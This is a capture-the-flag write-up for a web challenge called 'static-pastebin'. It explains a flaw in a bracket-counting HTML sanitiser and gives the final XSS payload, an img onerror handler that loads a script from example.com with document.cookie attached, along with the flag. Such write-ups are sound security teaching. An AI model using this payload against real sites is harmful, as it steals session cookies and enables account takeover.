# static-pastebin (374 solves)

Source: [script.js](./script.js)

```js
function clean(input) {
	let brackets = 0;
	let result = "";
	for (let i = 0; i < input.length; i++) {
		const current = input.charAt(i);
		if (current == "<") {
			brackets++;
		}
		if (brackets == 0) {
			result += current;
		}
		if (current == ">") {
			brackets--;
		}
	}
	return result;
}
```

The script appears to clean our input by stripping tags. However, there is a flaw. If we include an unmatched close bracket at the beginning of our exploit, the clean function will allow us to include html tags unchanged. The rest of the exploit is classic XSS in order to steal the admin cookies.

Final Exploit:

```html
><img src="" onerror="a=document.createElement('script'),a.setAttribute('src','https://example.com/x.js?cookie='+document.cookie),document.body.appendChild(a)" />
```

Flag: flag{54n1t1z4t10n_k1nd4_h4rd}
